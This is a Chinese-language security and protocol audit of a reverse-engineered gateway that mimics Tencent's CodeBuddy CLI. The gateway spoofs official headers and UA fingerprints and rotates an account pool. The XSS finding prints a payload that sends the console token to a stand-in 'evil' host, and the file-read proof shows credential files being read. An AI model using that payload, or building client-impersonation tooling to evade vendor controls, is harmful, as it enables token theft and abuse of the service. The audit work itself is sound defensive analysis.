# CodeBuddy 逆向网关 · 完整深度分析报告

> 分析对象：`D:\AI\tencent-ai-codebuddy-code`
> 分析日期：2026-11-28
> 版本基线：`package.json` = 2.5.0 / `CHANGELOG.md` = 2.179.0-gw.32 / 上游对齐 `CURRENT_VERSION` = 2.179.0
> 代码规模：后端 25 个 `.mjs`/`.js`，12,602 行；前端 4 个 `.html`/`.css` + 7 个 `.js`，1,775 + 4,700 行
> 运行时依赖：**0**（纯 Node ESM + `node:sqlite`）；自动化测试：**0**

---

## 摘要

这是一个**协议保真度极高、工程质量参差**的项目。

它最扎实的部分是"复刻腾讯 CodeBuddy CLI 协议"这条主线：38 个请求头逐项对齐、超时/重试常量全部可追溯到 CLI 源码偏移、空流判定逐字移植官方三标志语义。这部分有 `AGENTS.md` 的强制纪律（"没有 CLI 依据的实现视为不合格"）作为制度保障，并且已被抓包证据反复校验。

它最危险的部分集中在四处，且**全部经过本报告的实证验证**：

1. **进程可被单个畸形 HTTP 请求打挂**（`unhandledRejection` 无全局兜底 + 5 处裸 `JSON.parse` 在事件监听器里）。已在 Node v26.13.1 上复现进程退出。
2. **鉴权边界穿透**：默认配置下，任何持网关 API Key 的模型调用方 = Web 控制台管理员。叠加存储型 XSS，可升级为令牌窃取。
3. **协议对齐存在两处归因错误**：`mb=3e5` 被误认为"空流重试窗口"（实为看门狗退避上限），`CODEBUDDY_STREAM_TIMEOUT_MS` 被误认为"流总时长"（实为空闲超时）。数值巧合相同，语义完全不同——这会让后续维护者基于错误模型做改动。
4. **Docker 形态是"能启动、看似正常、实则有损"的失败模式**：基础镜像 Node 18 让日志 DB 静默降级、未挂载 `logs.db`/`backups/`/`product.json` 导致重建丢数据、无 `.dockerignore` 使构建上下文达 335 MB、冷启动会自行生成新 API Key。运行时的真实形态是 systemd 单实例（ARM64 机顶盒，常驻 37.8 MB），而"单实例"这一硬约束没有任何文档写明。

---

## 一、架构与数据流

### 1.1 分层

```
gateway.mjs (13 行，纯入口)
  └─ src/server.mjs (265 行)          HTTP 总线 + 全局鉴权 + 优雅停机
      ├─ src/adapters/               协议转译（客户端 ←→ 上游）
      │   ├─ openai.mjs     (654 行) /v1/chat/completions
      │   ├─ anthropic.mjs  (807 行) /v1/messages
      │   └─ tools.mjs      (82 行)  /v1/search、/v1/fetch
      ├─ src/upstream/               官方协议层
      │   ├─ headers.mjs    (254 行) 38 个请求头 + UA 风控
      │   ├─ payload.mjs    (410 行) 请求体构造 + 推理参数规整
      │   ├─ models.mjs     (485 行) /v3/config 模型矩阵 + 繁忙度探针
      │   ├─ errors.mjs     (150 行) 业务码枚举 + 错误归一
      │   └─ stream-guard.mjs (393 行) 超时/保活/空流分类
      ├─ src/core/                  基础设施
      │   ├─ scheduler.mjs  (1248 行) 账号池调度（最大模块）
      │   ├─ metrics.mjs    (743 行) 统计与报表
      │   ├─ database.mjs   (417 行) logs.db / credit_history
      │   ├─ config.mjs     (816 行) 配置 + 三级容灾持久化
      │   ├─ logger.mjs     (173 行) 环形缓冲 + 文件 + SQLite
      │   ├─ pricing.mjs    (203 行) 单价表与成本核算
      │   ├─ log-parser.mjs (173 行) 从 gateway.log 重建统计
      │   └─ tls-certs.mjs  (115 行) 系统 CA 栈注入
      └─ src/web/                  控制台
          ├─ routes.mjs     (1273 行) 40 个 /api/* 路由
          └─ public/        index.html(1539) + 7 JS + 3 CSS
```

**依赖方向是单向的**（`config ← logger ← database ← scheduler ← adapters`），无循环引用。这是全项目架构上最干净的一点。

### 1.2 一次对话请求的完整链路

```
客户端 POST /v1/chat/completions
  │
  ├─[server.mjs:120] 鉴权：isValidApiKey → 常量时间比对
  ├─[server.mjs:54]  readRequestBody：50MB 上限 + Content-Length 预检
  │
  ├─[openai.mjs:88]  JSON.parse → 提取 sessionKey（4 级回落）
  ├─[openai.mjs:95]  parseModelRegion：剥离 cn: / intl: 前缀
  ├─[openai.mjs:105] 黑名单拦截（403）
  ├─[openai.mjs:139] createUpstreamLifecycle：AbortController + 首字节超时
  ├─[openai.mjs:141] 构造 upstreamPayload（固定 stream:true）
  ├─[openai.mjs:164] applyModelCapabilityGuards：剥离不支持的能力
  ├─[openai.mjs:167] applyReasoningParams：三级决议链
  │
  └─[openai.mjs:413] executeRequestChain（★ 核心）
       │  候选链 = [主模型] + config.modelFallback[...]
       └─ 对每个候选模型：
            └─ while(true) 账号轮换：
                 ├─[scheduler:215] selectAccount（pin → sticky → 过滤 → 策略）
                 ├─ acc.inFlight++（与选号同 tick，无 await，无竞态）
                 ├─[payload:86]   applySystemPromptPolicy  ← ⚠ 在重试循环内，见 §5.1
                 ├─[payload:68]   ensureLeadingSystemMessage（仅 intl）
                 ├─[payload:389]  prepareUpstreamBody（>2048B 才 gzip）
                 ├─[headers:189]  buildOfficialUpstreamHeaders（38 头）
                 ├─ fetch(ep.upstream, { signal: lifecycle.signal })
                 │
                 ├─ 非 2xx → 按业务码分派：
                 │     6003/6004/6007/6008/429 → 模型冷却 600s → 换号 → 换模型
                 │     14001…14023 / 402        → 账号冷却 86400s → 换号
                 │     401                      → status='unauthorized' → 换号
                 │     11140/11142              → status='restricted'  → 换号
                 │     11158                    → 模型冷却 3600s → 直接失败
                 │
                 └─ 2xx → 返回 { ok:true, res, model, acc }
       │
       ├─ 流式：res.writeHead(200,SSE) → readUpstreamStream（静默看门狗 + 心跳）
       │        → 补终态帧（空流 error / 截断 length）→ finally 释放 inFlight
       └─ 非流式：完整聚合 → 组装 chat.completion → finally 释放 inFlight
```

### 1.3 Anthropic 链路的差异

`anthropic.mjs` 与 `openai.mjs` 的 `executeRequestChain` 是**同构复制**：实测两侧函数体仅 34 / 16 行非空行不同，重复约 11.4 KB 代码。差异只在错误响应的 JSON 包装形式与流式事件映射。这会带来长期的双份维护成本（§5.2）。

---

## 二、协议对齐核查（对照官方 CLI 源码）

核查方法：直接在 `package/dist/codebuddy-headless.js`（28.2 MB，单行压缩，主逻辑在第 1781 行）中定位常量与语义，读取原始代码片段。

### 2.1 常量对照表

| 项 | 网关取值 | CLI 实际源码 | 判定 |
|---|---|---|---|
| `CODEBUDDY_FIRST_TOKEN_TIMEOUT_MS` | 1,200,000 | `mm=12e5` + `resolveTimeoutMs` 校验 `>0` | ✅ 一致 |
| `CODEBUDDY_STREAM_TIMEOUT_MS` | 1,200,000（当**静默**看门狗） | `my=12e5`，语义是 **1s 巡检的 `now-lastDataAt` 空闲超时** | ⚠️ 数值对、**语义需更正** |
| 重试上限 | 8（硬上限 15） | `mC=8`、`mv=15`、`Math.min(x,mv)` | ✅ 一致（缺连接级 `Q9=3` / 401 级 `0` 分档） |
| `CODEBUDDY_REASONING_KEEPALIVE_INTERVAL_MS` | 默认 5000（注释称"与官方一致需设 0"） | `ej` 默认 **0 = 关闭** | ⚠️ 默认值不同（有注释说明理由，属可接受偏离） |
| finish_reason 宽限 | 5,000 | `tf=5e3`（两处用途：优雅关闭 + 等 usage 尾包） | ✅ 一致 |
| 空流重试窗口 | **注释归因于 `mb=3e5`** | `mb=3e5` 是**看门狗退避上限**；真正的空流窗口是独立常量 **`AK=3e5`** + `CODEBUDDY_EMPTY_STREAM_RETRY_MAX_ELAPSED_MS` | ❌ **归因错误** |
| 空流三标志 | 正文/思考/工具/拒答 → `reasoning-only`/`no-token` | 判定式逐字一致 | ✅ 一致（但触发门槛更严，见下） |

### 2.2 两处需要修正的语义偏差

**(a) `mb` 的归因错误** — `stream-guard.mjs:8` 注释写"`mb = 3e5` 空流重试窗口 5 分钟"。CLI 实测原文：

```js
// offset 7292959
let mE=1e3,mw=32e3,mC=8,mv=15,mb=3e5,...
// offset 7310737 —— mb 的唯一使用点
let em=e_&&!eh, ey=eh&&!ew?mC:eb;
eR = em ? mb : mw,        // ★ 退避上限：看门狗 300000ms / 普通 32000ms
```

而真正的空流重试窗口在另一处：

```js
// offset 15560413
let AK=3e5;
function resolveEmptyStreamRetryMaxElapsedMs(){
  let eA=Number.parseInt(process.env.CODEBUDDY_EMPTY_STREAM_RETRY_MAX_ELAPSED_MS??"",10);
  return Number.isFinite(eA)&&eA>=0?eA:AK}
function isRetryableEmptyStreamError(eA){
  if(!(eA instanceof tq.mY)||"reasoning-only"!==eA.emptyStreamKind&&"no-token"!==eA.emptyStreamKind)return!1;
  let el=resolveEmptyStreamRetryMaxElapsedMs();
  return el<=0||(Number.isFinite(eA.elapsedMs)?eA.elapsedMs:0)<el}
```

**影响**：数值恰好都是 `3e5`，所以行为没出错；但注释指向了错误的变量。一旦 CLI 后续把 `mb` 与 `AK` 分开调整（它们本来就是无关的两个常量），维护者会跟着改错地方。这直接违反 `AGENTS.md` 第 0 条"数值必须可追溯"。

**(b) "流总时长"应为"空闲超时"** — CLI 是每 1000 ms 巡检 `el = now - lastDataAt`，且已收 finish_reason 时改走优雅关闭：

```js
// offset 7336297
if(el>=eF){
  if(e3) this.logger.info(`[ModelProvider] Graceful close: finish_reason already received, stream idle for ${eF}ms, ...`), gracefulCloseStream();
  else ... error(new wM(eF,...))   // StreamTimeoutError，可重试
}
```

网关把它当作静默看门狗使用，**行为上恰好吻合**，但注释（`stream-guard.mjs:26-29`）声称"官方是总时长上限而非静默上限"——这句话是反的。注释与实现自相矛盾，属于文档债。

### 2.3 请求头：对齐度最高的部分（38 项逐项核对）

抓包证据 `.capture/hook/logs/outbound.log` 实测 CLI 真实出站头，与网关 `headers.mjs` 对照：

| 类别 | 头 | 实测值 | 网关实现 |
|---|---|---|---|
| 基础 | `User-Agent` | `CLI/2.177.1 CodeBuddy/2.177.1` | `CLI/2.179.0 CodeBuddy/2.179.0`（版本号随基线，✅） |
| | `Accept` | `application/json`（即使 stream） | ✅ 一致 |
| | `X-Requested-With` | `XMLHttpRequest` | ✅ 一致 |
| | `Content-Encoding` | `gzip`（大包） | ✅ 一致（>2048B） |
| 链路 ID | `X-Request-ID` = `X-Conversation-Message-ID` | 同值（32 hex） | ✅ 2+2 分组已对齐 |
| | `X-Conversation-Request-ID` = `X-Root-Request-ID` | 同值（32 hex） | ✅ |
| | `X-Conversation-ID` | UUIDv7 带横线，跨轮不变 | ✅ 含 32hex→UUIDv7 形态转换 |
| 指纹 | `x-stainless-{arch,lang,os,package-version,retry-count,runtime,runtime-version}` | 实测 `7.39.0` / `Windows` / `x64` / `node` | ✅ 一致（2026-11-28 重新抓包确认，见 §2.4） |
| 追踪 | `traceparent` / `baggage` / `b3` / `X-B3-*` / `X-Trace-ID` | W3C + B3 双链 | ✅ 一致 |
| 身份 | `X-Domain` / `X-Product` / `X-Private-Data` | `www.codebuddy.cn` / `SaaS` / `false` | ✅ 三套身份自动判定 |
| Agent | `X-Agent-Intent` / `X-Agent-Runtime` / `X-Agent-Purpose` / `X-Agent-Type` | `craft` / `other` / `conversation` | ✅ |

**关于 `x-stainless-*` 的一个调查插曲**（值得记录为方法论教训）：

在 CLI 源码中找到一份"内部头清理名单"，`X-Requested-With`、`User-Agent`、`X-Domain`、`x-stainless-*` 都在里面：

```js
// offset 7292553
mh=[...uH.PRIVATE_DATA_HEADER,"X-User-Id","X-Enterprise-Id","X-Tenant-Id",
    "X-Department-Info","X-Domain","User-Agent","X-Requested-With"],
mg=["x-stainless-"],
mf=new Set(mh.map(eA=>eA.toLowerCase()));
function isSkippableInternalHeader(eA){return mf.has(eA)||mg.some(el=>eA.startsWith(el))}
```

初看像是"CLI 会删掉这些头"，与抓包矛盾。继续追查发现**有前置条件**：

```js
let eZ=!!(eL?.[ENV_KEY_CODEBUDDY_SKIP_INTERNAL_HEADERS]||process.env[ENV_KEY_...]);
if(eZ){ eb[HTTP_HEADER_SKIP_AUTH_INTERCEPTOR]="1";
  for(let el of Object.keys(eb)){ let ec=el.toLowerCase();
    (isSkippableInternalHeader(ec)||eA.has(ec))&&delete eb[el] } }
```

**只有设了 `CODEBUDDY_SKIP_INTERNAL_HEADERS` 环境变量才删**。默认不删——抓包实测证明这些头确实在线上。网关不设该变量，因此行为正确。

> 教训：静态读压缩产物得到的"事实"必须被运行时证据校验。本报告据此对若干疑似问题做了降级或撤回。

**唯一存的疑点（已于 2026-11-28 解决）**：早期抓包 `x-stainless-package-version = 6.25.0`，网关发 `7.39.0`，曾怀疑不一致。经重新抓包确认：`6.25.0` 属于 CLI **2.177.1**，`7.39.0` 属于 CLI **2.179.0**，网关取值**正确**。详见 §2.4。

### 2.4 重新抓包验证 `x-stainless-package-version`（2026-11-28）

### 2.5 远端 `/v3/config` 刷新机制核对（CLI 与网关差异）

**CLI 侧实测**（`package/dist/codebuddy-headless.js`，全部常量已定位到字节偏移）：

| 机制 | 常量 / 变量 | 实测值 | 位置 |
|---|---|---|---|
| 内存缓存 TTL | `PRODUCT_CONFIGURATION_CACHE_TIMEOUT` | `48e4` = 480,000 ms（8 分钟） | offset 17656242 |
| 懒刷新触发 | `new Proxy(config, { get })` 内比对 `Date.now() - lastSyncTime` | 超 8 分钟且**下次读取配置属性**才触发 | offset 17641269 / 17644468 |
| 节流窗口 | `PROXY_SYNC_THROTTLE_MS`（静态字段） | `2e3` = 2,000 ms | offset 17634309 |
| 磁盘缓存 TTL | `MAX_CACHE_TTL` | `48e4` | offset 17634309 |
| CloudProductManager 内存 LRU | `e_` | `48e4`，`updateMemCache` 写 `expireAt = Date.now() + e_` | offset 17592239 / 17597934 |
| 远端失败重试退避 | 数组 | `[1e3, 2e3, 4e3, 8e3, 16e3]` | offset 17594341 |
| 错误日志去重 | `eI` | `6e4` = 60,000 ms | offset 17592250 |
| **另一独立常量** | `eB` | **`15e3`** = 15,000 ms | offset 17592257 |

**必须修正的一处归因**：`15e3` 在配置管理器区间内只出现两次——一处是 `eB=15e3` 的常量声明，另一处是 `ProductProviderPriority.WORKSPACE=15e3`（优先级枚举，与时间无关）。全文件 `15e3` 共出现 40+ 次，绝大多数与配置刷新无关（微信 SDK、SSH、keepalive、team shutdown 等）。

因此"失败后冷却 15 秒，再按 1/2/4/8/16 秒退避重试"这个描述里，**`[1e3…16e3]` 退避数组是确凿的**（`fetchWithRetry` 的 `ed` 数组），但**"先冷却 15 秒"缺乏源码支撑**。`fetchWithRetry` 的实际行为是：进入即从 `1e3` 开始 sleep 再试，没有前置 15 秒等待。`eB` 仍被使用，但用途未在本轮确认——不应断言它是"失败冷却"。

**另一处需要区分**：`MIN_FAILURE_BACKOFF_MS = 3e4`（30s）、`MAX_FAILURE_BACKOFF_MS = 3e5`（300s）属于 `ModelsProductProvider`（offset 7930618），是**模型列表接口**的失败退避，指数公式为 `min(3e4 * 2^(n-1), 3e5)`。它和 `/v3/config` 的 `[1e3…16e3]` 是两套独立机制，不可混为一谈。

**禁止刷新的开关**（已逐项确认为真）：

- `CODEBUDDY_REMOTE_CONFIG_DISABLED`：`"1"` 或 `"true"` 均生效，走 `skip(eA,"env-disabled")`（offset 17602551）
- `config.disabled === true`：走 `skip(eA,"config-disabled")`（同处，且**先于**环境变量判断）
- `CODEBUDDY_DISABLE_PRODUCT_CACHE`：仅让 `loadFromCache()` 与 `saveToCache()` 早退，**不改变 8 分钟内存 TTL**（offset 17635263 / 17637237）

**网关侧现状**（`src/upstream/models.mjs:259-271`）：

```
TTL          = 5 * 60 * 1000  （5 分钟，硬编码）
刷新模型     = 启动/首次调用拉取 + TTL 过期后按需拉取（懒刷新，语义正确）
强制刷新     = fetchDetailedModels(true)  由 /api/models-detail?refresh=1 触发
失败退避     = 无（单次 try/catch 后静默跳过）
节流         = 无
```

**差异判定**：

| 维度 | CLI | 网关 | 判定 |
|---|---|---|---|
| 懒刷新语义 | 读取时触发 | 读取时触发 | ✅ 一致 |
| TTL 数值 | 480,000 ms | 300,000 ms | ⚠️ 不同（网关更短，属保守策略，已加注释标注） |
| 节流 | 2,000 ms | 无 | ⚠️ 缺失，可能并发轰炸上游 |
| 失败重试 | `[1e3…16e3]` 五轮 | 无 | ⚠️ 缺失，上游抖动时直接返回空 |
| 事件强制刷新 | `sync(true)` 多种事件 | 仅手动 `?refresh=1` | ⚠️ 缺 11136 模型权限错误触发 |
| 本地快照回放 | 磁盘缓存仅加速启动，非权威源 | **已于 gw.33 移除全部快照** | ✅ 已对齐（见下） |

> **2026-11-28 更新（gw.33）**：按 VG 决策，网关已**彻底移除 `product.json` 磁盘快照**——不再写入、不再读取、不再做跨区域快照补齐。模型列表现在只认上游 `/v3/config`，上游不可达时如实返回空列表。此前 §2.5 初版记录的"两层 TTL / 单区失败用快照补齐"已不再成立。
>
> 这一改动使网关在"不以本地数据源做业务回放"这点上与 CLI 语义一致（CLI 的磁盘缓存只用于加速启动）。相关验证：正常拉取返回 55 款且 `product.json` mtime 不变；模拟全失败返回 0 条；模拟仅国际版失败返回 34 款且无 `intl` 条目。

其中**最值得补的是 11136 触发**：CLI 有专门的 `ModelPermissionErrorInterceptor`——检测到错误码 `su=11136` 就强制 `productManager.sync(true)` 并重新附加模型列表（offset 15878514）。网关侧 `errors.mjs` 的 `ServerErrorCode` **不含 11136**，遇到该码只会当成普通上游错误返回，不会刷新模型矩阵。

> 说明：网关是"为多个下游客户端提供模型列表"，与 CLI"自己用"的目标不同，TTL 与重试策略不必逐字相同。但按 `AGENTS.md` 第 0 条，凡是偏离 CLI 的取值都必须在注释里写明「网关自有策略，无 CLI 对应实现」及理由——`models.mjs` 的 5 分钟 TTL 在 gw.33 中已补上完整来源说明。

**目的**：确认网关硬编码的 `7.39.0` 是否与 CLI 2.179.0 的实际出站值一致。

**方法**：用本地 `package/`（`@tencent-ai/codebuddy-code@2.179.0`）跑真实 CLI，通过 `node -r <preload> package/bin/codebuddy -p "say hi"` 注入最小抓包钩子，只记录 `x-stainless-*` / UA / 关键头，写入独立日志。鉴权用 `CODEBUDDY_AUTH_TOKEN`（取自现有账号，仅注入进程环境，未落盘、未打印）。共跑两轮以排除变量污染。

**结果**：

| 运行 | 环境变量 | 请求 URL | `x-stainless-package-version` |
|---|---|---|---|
| 第 1 轮 | 设 `CODEBUDDY_BASE_URL=https://copilot.tencent.com` | `https://copilot.tencent.com/chat/completions`（**缺 `/v2`**） | `7.39.0` |
| 第 2 轮 | 不设 BASE_URL（CLI 默认） | `https://copilot.tencent.com/v2/chat/completions` | `7.39.0` |

两轮一致，且第 2 轮模型正常回复（`Hi! How can I help you today?`），证明是完整成功链路而非错误路径的出站。

**结论**：

1. **`x-stainless-package-version = 7.39.0` 确认无误**，网关 `headers.mjs:257` 的硬编码与 CLI 2.179.0 实测一致。
2. `6.25.0` 是 CLI **2.177.1** 的值，与 2.179.0 无关。此前的疑点消除。
3. `x-stainless-runtime-version` 实测为 `v26.13.1`，即**真实 Node 运行时版本**；网关用 `process.version`（`headers.mjs:260`），语义正确 —— 它应当反映运行环境而非硬编码。

**顺带确认的一处 CLI 行为**（值得写入 `AGENTS.md`）：`CODEBUDDY_BASE_URL` 是**完整基址覆盖**，CLI 只在其后拼 `/chat/completions`。因此把它设成 `https://copilot.tencent.com` 会得到 `https://copilot.tencent.com/chat/completions`（丢 `/v2`）。若要覆盖，必须写 `https://copilot.tencent.com/v2`。这解释了本仓库早期抓包中"两条路径并存"的现象——不是版本差异，而是该变量是否设置。

---

## 三、流式稳定性机制（全项目最精细的部分）

### 3.1 三层防护

| 层 | 机制 | 阈值 | 作用 |
|---|---|---|---|
| 首字节 | `firstByteTimer` | 1,200,000 ms | 覆盖"响应头到达 + 首个 token" |
| 静默看门狗 | `resetIdle()` | 300,000 ms | 每 chunk 重置，超时 abort |
| 心跳保活 | `startHeartbeat()` | 5,000 ms | 向上游静默时向**下游**补帧 |

### 3.2 心跳为什么必须是协议事件而非注释帧

`stream-guard.mjs:243-258` 的注释记录了这个根因，且是整个项目最有价值的一段工程反思：

> 为什么不能只发注释帧：`": keepalive"` 是 SSE 传输层的 no-op，多数客户端解析器会在事件层直接丢弃它，不计入「本流仍然活着」的证据。思考 60s+ 时 Claude Code 就会抛 `Stream ended without finish_reason`。

因此按协议发**语义合法且内容为空**的真实事件：
- Anthropic → `event: ping` / `{"type":"ping"}`
- OpenAI → `data: {choices:[{delta:{},finish_reason:null}]}`

### 3.3 `touch()` 的调用位置是一处精妙设计

`anthropic.mjs:492-494` 的注释：

> 注意：这里不能调 `heartbeat.touch()`。思考型模型在上游持续吐 reasoning chunk，但只在映射出可见事件时才真正写给客户端；若在此处刷新计时器，保活帧将永远不会发出。

实现上用 `wroteVisible` 标志位严格控制（`anthropic.mjs:608`）。而在 `openai.mjs:458` 则直接 `onChunk` 后 touch——因为 OpenAI 协议是纯透传，chunk 本身就是写给客户端的。**两种协议两种策略，各自正确**。

### 3.4 空流分类器

`createDeltaClassifier()`（`stream-guard.mjs:339-383`）逐字对齐 CLI 的三标志语义：

```
hasContent            = 正文 || 思考 || 工具 || 拒答   // 思考也算"活着"
hasSubstantiveContent = 正文 || 工具 || 拒答           // 思考不算实质产出
emptyStreamKind       = hasSubstantiveContent ? null
                      : hasReasoning ? 'reasoning-only' : 'no-token'
```

**但触发门槛比 CLI 宽松**。CLI 原文只在特定 finish_reason 下才判空流：

```js
// offset 7342799
if(!e3&&("error"===eA.finishReason||"length"===eA.finishReason&&!eg)
   &&(eA.terminalFailure||!tp&&!eA.hasSubstantiveContent)){ ... }
```

即 `finish_reason="stop"` **不触发**空流判定。网关的 `openai.mjs:497` 是 `!sawFinish && !sawError` 就进判定分支。实际影响有限（因为 `sawFinish` 为真时已跳过），但语义不等价，属 §5.4 的"精确对齐缺口"。

---

## 四、安全态势（全部经实证）

本节每一条都用可复现的方式验证过，不是静态推断。

### S0 · 严重：单个畸形请求可终止整个网关进程

**根因链**（三处叠加）：

1. `server.mjs:82` —— `handler(req, res, rawBody)` 调用 **不 await、不 catch**：
   ```js
   req.on('end', () => {
     if (aborted) return;
     handler(req, res, rawBody);      // ← async 函数，返回的 Promise 被丢弃
   });
   ```
2. `server.mjs` 及全项目 —— **无 `unhandledRejection` / `uncaughtException` 兜底**（grep 零命中）。
3. `routes.mjs` —— 5 处 `req.on('end', async () => { JSON.parse(b) ... })` **无 try/catch**：行 `768`、`791`、`817`、`992`、`1279`。

**实证**（Node v26.13.1）：

```
$ node _probe_crash.mjs        # 复刻 routes.mjs:992 结构，发送 body = "{not-valid-json"
SyntaxError: Expected property name or '}' in JSON at position 1
    at JSON.parse (<anonymous>)
    at IncomingMessage.<anonymous>
    ...
[exit code: 1]                 ← 进程终止
```

**第二条独立路径**（流式分支的时序缺陷）：

```js
// openai.mjs
427: res.writeHead(200, { 'Content-Type': 'text/event-stream' });   // ← 头已发出
434: const reader = upstreamRes.body.getReader();                     // ← 若 body 为 null 则同步抛错（在 try(452) 之外）
679: } catch (err) { res.writeHead(500, ...) }                        // ← 二次 writeHead → ERR_HTTP_HEADERS_SENT
518: } finally { activeAcc.inFlight = ...-1 }                         // ← 根本没进 try，inFlight 泄漏
```

实证：

```
$ node _probe_combo.mjs
[catch 679] 捕获: TypeError - Cannot read properties of null (reading 'getReader')
Error [ERR_HTTP_HEADERS_SENT]: Cannot write headers after they are sent to the client
[exit code: 1]                 ← 进程终止，且 inFlight 永久 +1
```

**触发门槛**：`/api/*` 需要 Web 令牌。但按 S1，**任意 API Key 就是 Web 令牌**。所以"能调模型的任何下游客户端"都能打挂网关。

**修复优先级：P0**。两行代码即可止血：
```js
process.on('unhandledRejection', e => Logger.error('SYSTEM', 'unhandledRejection', { msg: e?.message }));
process.on('uncaughtException',  e => Logger.error('SYSTEM', 'uncaughtException',  { msg: e?.message }));
```
并把 `handler(...)` 改为 `Promise.resolve(handler(...)).catch(...)`。

### S1 · 严重：API Key 即控制台管理员

`routes.mjs:50-64`：

```js
export function getWebAuthPassword() {
  if (config.webPassword?.trim()) return config.webPassword.trim();
  return config.apiKey;                                  // ← 回落
}
export function verifyWebAuthToken(token) {
  if (config.webAuthEnabled === false) return true;
  if (config.webPassword?.trim()) return safeCompareTokens(token, config.webPassword.trim());
  return isValidApiKey(token);                            // ← 遍历全部 apiKeys
}
```

叠加 `config.mjs:453-469` 的 `isValidApiKey` 遍历**所有**启用 key，结论是：**任何一枚 `sk-cb-…` 都能通过 `/api/*` 的身份校验**。

`/api/settings`（`routes.mjs:182-215`）直接回传：`apiKey`(185)、`apiKeys[]`(187)、`webPassword` 明文(189)、`rootDir` 绝对路径(213)。

→ 下游用户可读取全部密钥、**关闭 Web 鉴权**(277)、替换密钥池(251)、删除账号、清空日志。

**当前实例实测**：`webAuthEnabled=true` 且**已设置独立 `webPassword`**，因此这条链在本机**未被触发**。但它是代码路径上的默认行为，任何不带 `webPassword` 的部署都中招。

### S2 · 高：CORS 全通 + 无 CSRF + 令牌可走 URL

- `server.mjs:98-100`：`Access-Control-Allow-Origin: *` + `Allow-Headers: *`，OPTIONS 一律 200。
- 无 CSRF token、无 `Origin`/`Referer` 校验。
- 路由只 `JSON.parse`，**不校验 `Content-Type`** → `text/plain` 的"简单请求"可直接命中，绕过预检。
- `routes.mjs:143-146, 159-161` 支持 `?token=` 查询参数；前端导出日志正是这么用的（`logs.js:224`）→ 令牌进地址栏/历史/Referer。

### S3 · 高：存储型 XSS → 窃取控制台令牌

`accounts.js:468-469`：

```js
<td><code>${a.uid}</code></td>
<td><b>${a.email || a.uid}</b></td>
```

`a.email` / `a.uid` / `a.note` 来自 `POST /api/accounts/import`（`routes.mjs:1221-1247`，接受任意 JSON）与 OAuth 上游返回，**网关不做任何校验**。同文件的 `escapeHtml` 存在（`core.js:213`）且在 56 处使用，唯独这些位置直插。

**实证**：

```
--- accounts.js:469 渲染（未转义）---
<td><b><img src=x onerror="fetch(`//evil/?k=`+localStorage.getItem('cb_web_token'))">@evil.com</b></td>

--- accounts.js:372 note 字段（已转义，对照）---
<span>note: &lt;script&gt;alert(2)&lt;/script&gt;</span>
```

`cb_web_token` 就存在 `localStorage`（`core.js:124`），而 UI 明确鼓励"粘贴官方 CLI 导出的 JSON"（`index.html:1479-1487`）——攻击者只需给受害者一段"导出凭据"，即可拿到令牌，把 S1 升级为完整接管。

**附带的转义缺陷**：`escapeAttr`（`core.js:222`）先转 `\\` 再转 `'`，导致 `a\` 变成 `a\\'` 把闭合引号转义掉，破坏属性边界；且它不处理 `& < >`，被用于 HTML 属性上下文（`title="${escapeAttr(x)}"`）本身就不正确。另 `escapeHtml` 不转 `'`，不能用于单引号属性。

### S4 · 中：任意文件读取 → 经上游外带

`config.mjs:793-813` 的 `loadSystemPromptContent(filePath)` 对**任意路径**直接 `fs.readFileSync`，无白名单、无 `..` 检查。而 `promptPolicy.file` 可由 `POST /api/settings` 设置（`routes.mjs:227-231`），随后 `applySystemPromptPolicy` 会把文件内容注入为 `system` 消息（`payload.mjs:86-127`）**发往腾讯上游**。

**实证**：

```
file="config.json"        | 读到长度=1151   | 回落默认=false | 首 60 字符="{\n  \"port\": 8317,\n  \"apiKey\": \"sk-codebuddy-gateway-token\",\n"
file="accounts.json"      | 读到长度=29012  | 回落默认=false | 首 80 字符="[\n  {\n    \"uid\": \"2aac980c-...\",\n    \"uin\": \"33010967111"
file="src/config.mjs"     | 读到长度=27606  | 回落默认=false | 首 60 字符="import fs from 'node:fs';\n..."
```

当前 `promptMode=passthrough`（不注入），所以链路未激活。但配置一旦切到 `custom`/`append`，就是一个"把 accounts.json 全量 token 发到上游"的信道。

### S5 · 中：`/api/oauth/poll` 向前端回传长效凭据

`routes.mjs:952-953` 把 `accessToken` + `refreshToken` 随响应回给浏览器，而账号卡片**根本不需要展示 token**。对比：`/api/accounts`(603-649) 已谨慎地只挑白名单字段、`/api/accounts/import`(1257-1265) 也不回 token——说明团队有意识，唯独此处破例。任何 XSS（S3）或浏览器插件都能直接拿到比网关 Key 更高价值的 refreshToken。

### S6 · 已核实的"安全项"（避免误报）

| 项 | 结论 |
|---|---|
| SQL 注入 | ✅ 全部参数化（`database.mjs:215-238, 352-378`），LIKE 用 `?` 绑定 |
| 命令注入 | ✅ `execSync` 仅 `tls-certs.mjs:16,36`，脚本串为硬编码常量 |
| 静态文件路径穿越 | ✅ 不托管静态目录；`@include` 的 `relPath` 来自本地 index.html 而非请求 |
| 常量时间比对 | ✅ 三处调用点均用 `crypto.timingSafeEqual`（长度提前返回泄漏长度，理论风险） |
| 请求体上限 | ✅ `/v1/*` 有 50MB 上限 + 流式累计校验；⚠️ `/api/*` 22 处裸 `req.on('data')` 无上限 |
| 登录防爆破 | ❌ 无失败计数、无 IP 锁定、无限速 |
| 绑定地址 | ❌ `server.listen(PORT)` 默认全接口（未绑 `127.0.0.1`） |
| 安全响应头 | ❌ 无 `X-Frame-Options` / CSP / HSTS |

---

## 五、代码质量与缺陷清单

按"是否已实证"分级。标 **[实证]** 的都有可复现验证；标 **[静态]** 的是代码审阅结论。

### 5.1 [实证] `applySystemPromptPolicy` 在重试循环内被反复调用 → 提示词累积

`openai.mjs:252`（以及 `anthropic.mjs:291`）位于 `while(true)` 账号重试循环**内部**：

```js
while (true) {
  const acc = AccountScheduler.selectAccount(...);
  ...
  try {
    upstreamPayload.messages = applySystemPromptPolicy(upstreamPayload.messages);   // ← 每轮重试都执行
```

而 `applySystemPromptPolicy`（`payload.mjs:109-124`）的 `append` 模式**不是幂等的**——它扫描开头连续 system 块后插入，插入后 system 块变长，下次插入点后移。

**实证**：

```
初始: [{"role":"system","content":"client-system"},{"role":"user","content":"hi"}]
第 1 次调用后 system 消息数: 2 | 总消息数: 3
第 2 次调用后 system 消息数: 3 | 总消息数: 4
第 3 次调用后 system 消息数: 4 | 总消息数: 5
最终: ["system:client-system","system:[GATEWAY-PROMPT]","system:[GATEWAY-PROMPT]","system:[GATEWAY-PROMPT]","user:hi"]
```

**触发条件**：`promptMode=append` 且发生账号/模型切换（限流、401、11140 都很常见）。
**后果**：提示词重复 N 次 → token 膨胀 → 计费上升 → 可能触发上游 11115 上下文超限。
